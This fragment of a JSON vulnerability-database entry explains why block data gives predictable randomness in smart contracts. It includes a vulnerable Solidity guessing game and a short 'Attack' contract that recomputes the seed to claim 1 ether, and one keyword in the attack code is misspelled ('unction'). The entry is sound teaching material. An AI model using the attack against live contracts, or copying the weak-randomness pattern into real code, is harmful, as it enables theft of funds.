      "description": "\nIn blockchain, it is not possible to generate true randomness. \nThe absence of true randomness means that the results of random number generation can be predicted, allowing for manipulation.\n\nTrue randomness relies on unpredictable external factors such as atmospheric noise or user actions, but smart contracts do not have direct access to such factors, making it impossible to generate true randomness. \nThis limitation is particularly important when smart contracts are used for security mechanisms like private key generation, as attackers could potentially predict the private keys and gain unauthorized access to accounts or funds.\nThere are two main methods for generating random numbers in blockchain:\n\n1. Using Randomness from the Blockchain Network Nodes:\n\n   Blockchain networks provide certain variables in each block, such as `block.basefee(uint)`, `block.chainid(uint)`, `block.coinbase()`, `block.difficulty(uint)`, `block.gaslimit(uint)`, `block.number(uint)`, `block.timestamp(uint)`, and `blockhash(uint)`. \n   Among these, `block.difficulty`, `blockhash`, `block.number`, and `block.timestamp` are commonly used for random number generation.\n   \n   https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties:~:text=use%20utility%20functions.-,Block%20and%20Transaction%20Properties,%EF%83%81,-blockhash(uint%20blockNumber\n   \n   Randomness generated based on block data can limit the ability of typical users to predict the random numbers, but malicious miners can potentially manipulate block data to influence the generated randomness. \n   Block data remains the same for a given block, meaning that generating randomness from the same block will always produce the same result.\n\n2. Using External Random Number Generators:\n\n   Blockchain oracles can be used to generate random number seeds, and off-chain data can be obtained on-chain using on-chain oracles. \n   External randomness sources, such as API data, can be fetched and used to influence contract behavior. \n   This can increase unpredictability compared to generating randomness using blockchain variables, but it may introduce trust issues related to the oracle's reliability.\n    ",
      "background": "\n- Randomness in blockchain can be categorized into two types: pseudo-randomness and true randomness.\n    - Pseudo-randomness is generated by deterministic algorithms, and if you know the initial seed value, it can be predicted. \n    - True randomness relies on entropy sources and generates random values that are unpredictable.\n\n- Nodes in a blockchain network can generate pseudo-randomness using various algorithms, and this randomness is used in scenarios such as selecting lottery winners, distributing rewards, determining the rarity of NFT token items in games, and distributing loot.\n- However, blockchain ensures that all nodes in the network reach the same conclusion, so if the same input is provided, the output of a contract will always be the same.   \n    ",
      "exploit_scenario": "\n```solidity\ncontract GuessTheRandomNumber {\n    constructor() payable {}\n    function guess(uint _guess) public {\n        uint answer = uint(\n            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))\n        );\n \n        if (_guess == answer) {\n            (bool sent, ) = msg.sender.call{value: 1 ether}(\"\");\n            require(sent, \"Failed to send Ether\");\n        }\n    }\n }\n```\n \n- If you are generating random numbers by combining the `blockhash` and `block.timestamp` of the previous block as a seed, this is used in a contract where users can guess a number, and if their guess matches the generated number, they win `1 ether`. \n- While it may seem like randomness has been introduced, it's important to note that it can still be manipulated. \n\n```solidity\ncontract Attack {\n    receive() external payable {}\n\n    unction attack(GuessTheRandomNumber guessTheRandomNumber) public {\n        uint answer = uint(\n            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))\n        );\n \n        guessTheRandomNumber.guess(answer);\n    }\n \n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n }\n```    \n\n- The attacker deploys the `Attack` contract by providing the address of the `GuessTheRandomNumber` contract. \n- In the `attack` function, the attacker replicates the guessing logic of the `GuessTheRandomNumber` contract, using the same method of combining the `blockhash` and `block.timestamp` of the previous block as a seed to generate random numbers.\n\n- Since the `GuessTheRandomNumber` contract's `guess` function is executed in the same block, the values of `block.number` and `block.timestamp` remain unchanged within that block. \n- This allows the attacker to generate the same random number and, as a result, claim the `1 ether` prize.\n",
